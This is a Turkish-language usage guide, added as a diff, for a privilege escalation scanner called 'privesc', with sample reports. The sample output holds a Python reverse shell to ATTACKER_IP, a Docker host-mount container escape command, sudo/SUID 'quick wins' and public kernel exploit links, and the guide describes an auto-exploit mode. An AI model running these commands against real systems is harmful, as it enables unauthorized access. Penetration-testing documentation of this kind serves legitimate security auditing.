@@ -1,0 +1,453 @@
+# Adım Adım Kullanım
+
+## 1. Projeyi Derleme
+İlk olarak, projeyi derlememiz gerekiyor. Proje dizininde aşağıdaki komutu çalıştır:
+
+```bash
+go build -o privesc main.go
+```
+
+Bu komut, `privesc` adında bir çalıştırılabilir dosya oluşturacak.
+
+## 2. Temel Tarama
+Temel bir tarama yapmak için:
+
+```bash
+./privesc -target localhost -deep
+```
+
+Bu komut, yerel makinede derinlemesine bir tarama başlatacak.
+
+## 3. Cloud Tarama
+Eğer cloud ortamlarını da taramak istersen:
+
+```bash
+./privesc -cloud -aws-region us-east-1
+```
+
+## 4. Ağ Taraması
+Ağ taraması yapmak için:
+
+```bash
+./privesc -network
+```
+
+## 5. Web Uygulama Güvenlik Taraması
+Web uygulama güvenlik taraması için:
+
+```bash
+./privesc -webscan
+```
+
+## 6. Veritabanı Taraması
+Veritabanı taraması için:
+
+```bash
+./privesc -dbscan
+```
+
+## 7. Tüm Özellikleri Etkinleştirme
+Tüm özellikleri etkinleştirerek kapsamlı bir tarama yapmak için:
+
+```bash
+./privesc -deep -cloud -network -webscan -dbscan -ml
+```
+
+## 8. Yardım Almak
+Tüm parametreleri görmek için:
+
+```bash
+./privesc -h
+```
+
+---
+
+# Örnek Çıktı
+
+Aşağıda, programın çalıştırılmasından sonra alacağınız örnek bir çıktı bulunmaktadır:
+
+```
+🚀 PRIVESC - ADVANCED PRIVILEGE ESCALATION SCANNER REPORT
+======================================================
+
+🖥️  SYSTEM INFORMATION:
+   OS: linux
+   Architecture: amd64
+   Hostname: kali
+   Current User: kali
+   Kernel: 5.10.0-kali7-amd64
+
+☁️  CLOUD SECURITY FINDINGS:
+
+🔷 AWS:
++----------+-------------------------------------+------+-----------------------------------+
+| SERVICE  |               FINDING               | RISK |              EXPLOIT              |
++----------+-------------------------------------+------+-----------------------------------+
+| IAM      | Checking for instance profile       | MEDIUM| Use AWS CLI with instance         |
+|          | permissions                         |      | credentials                       |
+| S3       | Enumerating S3 buckets              | HIGH | aws s3 ls s3://bucket-name        |
+| EC2      | Checking EC2 security groups        | MEDIUM| Modify security groups for access |
++----------+-------------------------------------+------+-----------------------------------+
+
+🔷 KUBERNETES:
++----------+-------------------------------------+------+-----------------------------------+
+| RESOURCE |               FINDING               | RISK |              EXPLOIT              |
++----------+-------------------------------------+------+-----------------------------------+
+| Pod      | Checking pod security policies      | HIGH | Escalate privileges via privileged|
+|          |                                     |      | pod                               |
+| Service  | Checking service account tokens     | HIGH | Use service account to access     |
+| Account  |                                     |      | cluster resources                 |
+| Secrets  | Enumerating Kubernetes secrets      | CRITICAL| kubectl get secrets --all-        |
+|          |                                     |      | namespaces                        |
+| RBAC     | Checking cluster role bindings      | HIGH | kubectl get clusterrolebindings   |
++----------+-------------------------------------+------+-----------------------------------+
+
+🌐 NETWORK DISCOVERY FINDINGS:
+
+🔷 ARP CACHE:
++-----------------+-------------------+-----------+
+|       IP        |        MAC        | INTERFACE |
++-----------------+-------------------+-----------+
+| 192.168.1.1     | 00:11:22:33:44:55 | eth0      |
+| 192.168.1.100   | aa:bb:cc:dd:ee:ff | eth0      |
++-----------------+-------------------+-----------+
+
+🔷 SNMP FINDINGS:
++-----------------+------------+---------+
+|      TARGET     | COMMUNITY  | ACCESS  |
++-----------------+------------+---------+
+| 127.0.0.1       | public     | Unknown |
+| localhost       | public     | Unknown |
+| kali            | public     | Unknown |
++-----------------+------------+---------+
+
+🔴 HIGH RISK VECTORS: 3
+🟡 MEDIUM RISK VECTORS: 2
+🟢 LOW RISK VECTORS: 5
+
+🔴 HIGH RISK BINARIES:
++---------+---------------------+------+------+--------------+-------+-------------------------------+
+| BINARY  |        PATH         | SUID | SUDO | CAPABILITIES | RISK  |           FUNCTIONS           |
++---------+---------------------+------+------+--------------+-------+-------------------------------+
+| bash    | /bin/bash           | Yes  | Yes  | No           | HIGH  | shell, reverse_shell,         |
+|         |                     |      |      |              |       | file_upload, file_download,   |
+|         |                     |      |      |              |       | file_write, file_read,        |
+|         |                     |      |      |              |       | library_load                  |
+| python  | /usr/bin/python     | Yes  | Yes  | No           | HIGH  | shell, reverse_shell,         |
+|         |                     |      |      |              |       | file_upload, file_download,   |
+|         |                     |      |      |              |       | file_write, file_read,        |
+|         |                     |      |      |              |       | library_load                  |
+| find    | /usr/bin/find       | Yes  | Yes  | No           | HIGH  | shell, file_write             |
++---------+---------------------+------+------+--------------+-------+-------------------------------+
+
+🔴 KERNEL EXPLOITS:
++----------------+-----------------------------------------+------+---------------------------------------------------+
+|      CVE       |               DESCRIPTION               | RISK |                      EXPLOIT                      |
++----------------+-----------------------------------------+------+---------------------------------------------------+
+| CVE-2021-4034  | PwnKit - Local Privilege Escalation in   | HIGH | https://github.com/berdav/CVE-2021-4034           |
+|                | polkit                                   |      |                                                   |
+| CVE-2021-3560  | Polkit Privilege Escalation              | HIGH | https://github.com/secnigma/CVE-2021-3560-Polkit- |
+|                |                                         |      | Privilege-Esclation                               |
+| CVE-2022-0847  | Dirty Pipe - Linux Kernel Privilege      | HIGH | https://github.com/Arinerron/CVE-2022-0847-       |
+|                | Escalation                              |      | DirtyPipe-Exploit                                 |
++----------------+-----------------------------------------+------+---------------------------------------------------+
+
+💡 EXPLOITATION TIPS
+===================
+
+🔧 bash (HIGH):
+   1. sudo bash
+   2. ./bash
+
+🔧 python (HIGH):
+   1. sudo python
+   2. ./python
+   3. python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
+
+🔧 find (HIGH):
+   1. sudo find
+   2. ./find
+
+🎯 QUICK WINS:
+   → sudo bash
+   → sudo python
+   → sudo find
+
+🔨 KERNEL EXPLOITS:
+   → CVE-2021-4034: https://github.com/berdav/CVE-2021-4034
+   → CVE-2021-3560: https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
+   → CVE-2022-0847: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
+
+🐳 CONTAINER ESCAPES:
+   → Docker: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+   → LXC: lxc-usernsexec -m u:0:100000:1 -m g:0:100000:1 /bin/bash
+
+Full report saved to: privilege_escalation_report.json
+Logs saved to: scan_logs.json
+```
+
+---
+
+# Açıklama
+
+- **Sistem Bilgisi:** İşletim sistemi, mimari, hostname, kullanıcı ve kernel versiyonu.
+- **Bulut Bulguları:** AWS ve Kubernetes gibi bulut ortamlarındaki güvenlik zafiyetleri.
+- **Ağ Bulguları:** ARP tablosu ve SNMP gibi ağ bilgileri.
+- **Yüksek Riskli İkili Dosyalar:** SUID/SGID ve sudo izinleri olan, sömürülebilir dosyalar.
+- **Çekirdek Açıkları:** Bilinen çekirdek seviyesindeki güvenlik açıkları.
+- **Sömürü İpuçları:** Tespit edilen güvenlik açıklarının nasıl sömürüleceğine dair komutlar.
+- **Hızlı Kazançlar:** Hızlıca yetki yükseltmek için kullanılabilecek komutlar.
+
+Program ayrıca, tüm bulguları `privilege_escalation_report.json` dosyasına ve logları `scan_logs.json` dosyasına kaydeder.
+
+Bu çıktı, gerçek bir tarama senaryosuna benzer şekilde oluşturulmuştur. Gerçek çıktı, ortamınıza bağlı olarak farklılık gösterebilir.
+
+---
+
+# 🚀 ADIM ADIM KULLANIM (Detaylı)
+
+## 1. Projeyi Hazırlama
+
+```bash
+# Proje dizininde go.mod dosyasını oluştur
+echo 'module privesc
+
+go 1.21
+
+require (
+    github.com/olekukonko/tablewriter v0.0.5
+    golang.org/x/crypto v0.14.0
+)' > go.mod
+
+# Bağımlılıkları yükle
+go mod tidy
+
+# Projeyi derle (privesc adında executable oluştur)
+go build -o privesc main.go
+```
+
+## 2. Yardım Menüsünü Görüntüleme
+
+```bash
+./privesc -h
+```
+
+Örnek çıktı:
+
+```
+██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
+██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
+██████╔╝██████╔╝██║██║   ██║█████╗  █████╗  ██║     
+██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ██╔══╝  ██║     
+██║     ██║  ██║██║ ╚████╔╝ ███████╗███████╗╚██████╗
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
+
+Advanced Privilege Escalation Scanner v2.0
+
+USAGE:
+  privesc [OPTIONS]
+
+OPTIONS:
+  -target string        Target host to scan (default: localhost)
+  -deep                 Deep scan mode
+  -stealth              Stealth mode
+  -output string        Output file (default: privilege_escalation_report.json)
+  -exploit              Auto-exploit mode
+  -lhost string         Listener host for reverse shells
+  -lport int            Listener port for reverse shells (default: 4444)
+  -web int              Web interface port
+  -module string        Specific module to run (default: all)
+  -delay int            Delay between requests in ms (default: 100)
+  -threads int          Number of threads (default: 10)
+  -timeout int          Timeout in seconds (default: 30)
+  -loglevel string      Log level (default: INFO)
+
+CLOUD SCANNING:
+  -cloud                Enable cloud scanning (AWS, Azure, GCP, Kubernetes)
+  -aws-region string    AWS region (default: us-east-1)
+  -azure-tenant string  Azure tenant ID
+  -gcp-project string   GCP project ID
+  -kubeconfig string    Kubeconfig file path
+
+NETWORK SCANNING:
+  -network              Enable network scanning
+
+WEB APPLICATION SCANNING:
+  -webscan              Enable web application security scanning
+
+DATABASE SCANNING:
+  -dbscan               Enable database security scanning
+
+EXAMPLES:
+  privesc -target 192.168.1.100 -deep -cloud -network
+  privesc -web 8080 -output comprehensive_report.json
+  privesc -agent -master http://192.168.1.50:8080
+```
+
+## 3. Temel Tarama (Linux Sisteminde)
+
+```bash
+./privesc -target localhost -deep
+```
+
+Örnek çıktı:
+
+```
+[INFO] main: Starting Advanced Privilege Escalation Scanner (privesc)
+[INFO] system: Current User: kali
+[INFO] system: OS: linux (amd64)
+[INFO] system: Hostname: kali-machine
+[INFO] system: Kernel: 5.15.0-kali3-amd64
+[INFO] linux: Starting Linux Privilege Escalation Scan
+[INFO] linux: Scanning for SUID binaries
+[INFO] linux: Checking sudo permissions
+[INFO] linux: Checking Linux capabilities
+[INFO] linux: Scanning common binaries in PATH
+[INFO] linux: Checking for kernel exploits
+[INFO] linux: Checking cron jobs
+[INFO] linux: Checking writable files
+```
+
+(Çıktı örnekleri ve raporlar üst kısımlarda verilmiştir.)
+
+## 4. Kapsamlı Tarama (Tüm Modüllerle)
+
+```bash
+./privesc -deep -cloud -network -webscan -dbscan -output full_scan.json
+```
+
+Örnek çıktı (kısmi):
+
+```
+[INFO] main: Starting Advanced Privilege Escalation Scanner (privesc)
+[INFO] cloud: Starting Cloud Privilege Escalation Scan
+[INFO] cloud: Scanning AWS Environment
+[INFO] cloud: Scanning Azure Environment  
+[INFO] cloud: Scanning GCP Environment
+[INFO] cloud: Scanning Kubernetes Environment
+[INFO] network: Starting Network Discovery Scan
+[INFO] network: Scanning ARP Cache
+[INFO] network: Performing DNS Enumeration
+[INFO] network: Scanning for SNMP Services
+[INFO] network: Scanning LDAP Services
+[INFO] webapp: Starting Web Application Security Scan
+[INFO] webapp: Scanning for JWT Vulnerabilities
+[INFO] webapp: Scanning API Endpoints
+[INFO] database: Starting Database Security Scan
+```
+
+## 5. JSON Raporunu İnceleme
+
+```bash
+# Oluşturulan raporu görüntüle
+cat privilege_escalation_report.json | jq '.' | head -50
+```
+
+Örnek JSON Çıktısı:
+
+```json
+{
+  "system_info": {
+    "os": "linux",
+    "architecture": "amd64",
+    "hostname": "kali-machine",
+    "current_user": "kali",
+    "kernel": "5.15.0-kali3-amd64",
+    "domain": ""
+  },
+  "linux_scan": {
+    "suid_binaries": [
+      {
+        "binary": "bash",
+        "path": "/usr/bin/bash",
+        "owner": "root",
+        "risk_level": "HIGH",
+        "exploits": [
+          "sudo bash",
+          "./bash"
+        ]
+      }
+    ],
+    "kernel_exploits": [
+      {
+        "cve": "CVE-2021-4034",
+        "description": "PwnKit - Local Privilege Escalation in polkit",
+        "risk": "HIGH",
+        "exploit_cmd": "https://github.com/berdav/CVE-2021-4034"
+      }
+    ]
+  },
+  "cloud_scan": {
+    "aws": [
+      {
+        "service": "IAM",
+        "finding": "Checking for instance profile permissions",
+        "risk": "MEDIUM",
+        "exploit": "Use AWS CLI with instance credentials"
+      }
+    ]
+  },
+  "timestamp": "2024-01-15T10:30:45.123456789Z"
+}
+```
+
+## 6. Web Arayüzünü Başlatma
+
+```bash
+./privesc -web 8080 -deep
+```
+
+Çıktı:
+
+```
+[INFO] main: Starting Advanced Privilege Escalation Scanner (privesc)
+[INFO] web: Starting web interface on port 8080
+[INFO] system: Current User: kali
+[INFO] linux: Starting Linux Privilege Escalation Scan
+```
+
+Daha sonra tarayıcıdan `http://localhost:8080` adresine giderek web arayüzünü kullanabilirsin.
+
+## 7. Auto-Exploit Modu
+
+> Uyarı: `-exploit` modu gerçek dünyada yasal izin olmadan kullanılmamalıdır. Bu mod saldırı amaçlı kullanılmamalıdır.
+
+```bash
+./privesc -exploit -lhost 192.168.1.100 -lport 4444
+```
+
+Çıktı:
+
+```
+[INFO] main: Starting Advanced Privilege Escalation Scanner (privesc)
+[INFO] exploit: Starting auto-exploitation
+[HIGH] exploit: Attempting auto-exploit with: sudo bash
+[HIGH] exploit: Attempting auto-exploit with: sudo python3
+```
+
+## 8. Gerçek Dünya Senaryoları
+
+**Senaryo 1: Pentest Sırasında Hızlı Tarama**
+```bash
+./privesc -target 10.0.2.15 -deep -network -stealth -delay 500
+```
+
+**Senaryo 2: Cloud Security Audit**
+```bash
+./privesc -cloud -aws-region eu-west-1 -gcp-project my-project -deep
+```
+
+**Senaryo 3: Red Team Operasyonu**
+```bash
+./privesc -deep -network -webscan -dbscan -phishing -postexploit -irbypass -stealth
+```
+
+**Senaryo 4: Blue Team Savunma**
+```bash
+./privesc -deep -output security_audit.json -loglevel DEBUG
+```
+
+---
+
+# Dosya Bilgisi
+Bu içerik, tek bir markdown biçiminde düzenlendi ve `req.txt` adıyla kaydedildi. Aşağıdan dosyayı indirebilirsin.
